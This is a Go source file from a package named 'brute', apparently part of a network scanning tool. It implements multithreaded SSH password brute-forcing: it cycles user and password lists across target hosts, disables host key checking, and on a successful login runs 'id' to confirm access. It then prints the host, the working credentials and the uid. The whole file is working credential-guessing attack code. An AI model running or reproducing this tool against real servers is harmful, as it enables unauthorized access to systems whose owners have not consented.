package brute

import (
	"context"
	"fmt"
	"golang.org/x/crypto/ssh"
	"goon3/public"
	"net"
	"regexp"
	"runtime"
	"strings"
	"time"
)

func Ssh(hosts []string){
	runtime.GOMAXPROCS(runtime.NumCPU())
	user, pass := []string{},[]string{}
	if len(Par.User)>0{
		user = Par.User
	} else {
		user = Par.Brute.Ssh.Info.User
	}
	if len(Par.Pass)>0{
		pass = Par.Pass
	} else {
		pass = Par.Brute.Ssh.Info.Pass
	}
	input := make(chan BruteInfo,  len(hosts))
	result := make(chan string, len(hosts))
	defer close(input)

	/* 添加扫描数据 */
	go func() {
		CreateInfo(&input,hosts,user,pass)
	}()
	thread := 10
	if len(hosts) < Par.Thread {
		thread = len(hosts)
	} else {
		thread = Par.Thread
	}
	/* 开启扫描 */
	for i:=0;i< thread;i++{
		go sshWork(input,result)
	}

	/* 输出 */
	public.Out(result,Par.Ofile)
}

func sshWork(input chan BruteInfo,result chan string){
	for {
		task, ok := <-input
		if !ok {
			return
		}
		pool := BrutePool{}
		brute_result := make(chan string, 1)
		brute_pool := make(chan BrutePool, len(task.Users)*len(task.Passs))
		defer close(brute_pool)
		defer close(brute_result)
		// 由上下文统一管理
		ctx, cancel := context.WithTimeout(context.Background(), time.Duration(Par.Timeout+1)*time.Second)
		defer cancel()
		// 新建资源池
		for _, user := range (task.Users) {
			for _, pass := range (task.Passs) {
				pool.Host = task.Host
				pool.User = user
				pool.Pass = pass
				brute_pool <- pool
			}
		}
		// 启动爆破
		for i := 0; i < Par.Thread; i++ {
			go SshConn(ctx, brute_pool, brute_result)
		}
		// 等待回显
		select {
		case <-ctx.Done():
			result <- ""
		case flag := <-brute_result:
			result <- flag
			cancel()
		}
		time.Sleep(1*time.Second)
	}
}

func SshConn(ctx context.Context,Pool chan BrutePool,scan chan string){
	for{
		Pool, ok := <-Pool
		if !ok{
			return
		}
		Host, User, Pass := Pool.Host, Pool.User, Pool.Pass
		Pass = strings.Replace(Pass, "{{user}}", User, -1)
		Auth := []ssh.AuthMethod{ssh.Password(Pass)}
		config := &ssh.ClientConfig{
			User:    User,
			Auth:    Auth,
			Timeout: time.Duration(Par.Timeout) * time.Second,
			HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
				return nil
			},
		}
		client, err := ssh.Dial("tcp", Host, config)
		if err == nil{
			defer client.Close()
		}
		//x := fmt.Sprintf("%s", err)
		//scan <- fmt.Sprintf("%s %s %s %s",host,user,pass,x)
		/* 如果ssh连接无错 */
		if err == nil {
			defer client.Close()
			session, err := client.NewSession()
			if err == nil {
				defer session.Close()
				/* 某些session是假的，需要通过发送指令来进一步判断是否连接成功 */
				combo, _ := session.CombinedOutput("id")
				if string(combo)!=""{
					if find := strings.Contains(string(combo), "uid="); find {
						reg := regexp.MustCompile(`(uid=.*)\s*gid`)
						matches := reg.FindAllStringSubmatch(string(combo), 1)
						result := "[-]"
						if len(matches)>0{
							result = fmt.Sprintf("[SSH] %-40v %v:%-20v %-20v", Host, User, Pass, matches[0][1])
						} else {
							result = fmt.Sprintf("[SSH] %-40v %v:%-20v", Host, User, Pass)
						}
						select {
						case <- ctx.Done():
							return
						default:
							scan <- result
						}
					}
				}
			}
		}
	}
}